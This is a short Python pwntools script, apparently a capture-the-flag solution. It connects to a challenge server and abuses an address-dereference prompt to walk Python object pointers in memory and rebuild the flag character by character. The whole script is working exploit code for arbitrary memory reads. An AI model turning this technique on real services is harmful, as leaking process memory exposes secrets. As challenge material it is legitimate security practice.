#!/usr/bin/env python

from pwn import *
from string import printable

def nextMem(addr: bytes) -> bytes:
    return str(hex(int(addr, 16)+8)).encode()

def flip(addr: bytes):
    reversedb = b''.join(reversed([addr[i:i+2] for i in range(0, len(addr), 2)]))
    reversedh = b'0x' + reversedb
    return reversedh

def dereference(addr: bytes):
    io.sendlineafter(b': ', addr)
    return flip(io.recvline().strip()[20:32])

def dereferenceArr(addr: bytes, index: int):
    for _ in range(4):
        pointer = dereference(addr)
        addr = nextMem(addr)
    for _ in range(index+1):
        pointer2 = dereference(pointer)
        for _ in range(4):
            pointer3 = dereference(pointer2)
            pointer2 = nextMem(pointer2)
        pointer = nextMem(pointer)
    return pointer3

def dereferenceChildArr(addr: bytes):
    return dereference(nextMem(nextMem(nextMem(dereference(addr)))))

io = remote("pymempointers.ept.gg", 1337, ssl=True)
#io = process("handout/source.py")

io.recvuntil(b'id=')
addr = io.recvline().strip()
addr = str(hex(int(addr, 16))).encode()

result = []

for i in range(63, 100):
    try:
        result.append(chr(int(dereferenceChildArr(dereferenceArr(addr, i)), 16)))
    except:
        continue
    output = ''.join(result)
    print(output)
output = ''.join(result)
print(output)

io.close()
